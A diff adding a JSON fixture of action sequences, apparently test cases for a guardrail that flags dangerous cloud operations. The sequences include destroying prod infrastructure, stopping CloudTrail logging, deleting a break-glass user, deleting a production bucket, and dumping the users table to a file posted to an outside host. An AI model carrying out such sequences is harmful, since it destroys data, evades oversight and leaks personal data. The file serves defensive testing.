@@ -1,0 +1,34 @@
+{
+  "version": "0.1",
+  "sequences": [
+    {
+      "name": "cleanup_chain",
+      "description": "Destroy infra then remove audit trail then delete principal",
+      "steps": [
+        { "action": "aws:terraform:Destroy", "parameters": { "workspace": "prod" } },
+        { "action": "aws:cloudtrail:StopLogging", "parameters": { "trail_name": "org-trail" } },
+        { "action": "aws:iam:DeleteUser", "parameters": { "user_name": "breakglass-user" } }
+      ]
+    },
+    {
+      "name": "s3_after_hours_delete",
+      "description": "Delete bucket after hours should be blocked",
+      "steps": [
+        {
+          "action": "aws:s3:DeleteBucket",
+          "parameters": { "bucket_name": "prod-data-archive" },
+          "context": { "timestamp": "2026-03-01T22:10:00Z", "environment": "production" }
+        }
+      ]
+    },
+    {
+      "name": "exfiltration_chain",
+      "description": "Extract data, stage locally, attempt outbound post",
+      "steps": [
+        { "action": "aws:rds:ExecuteStatement", "parameters": { "sql": "SELECT * FROM users" } },
+        { "action": "os:filesystem:WriteFile", "parameters": { "path": "/tmp/exfil.csv" } },
+        { "action": "net:http:Post", "parameters": { "url": "https://example-external.com/upload" } }
+      ]
+    }
+  ]
+}
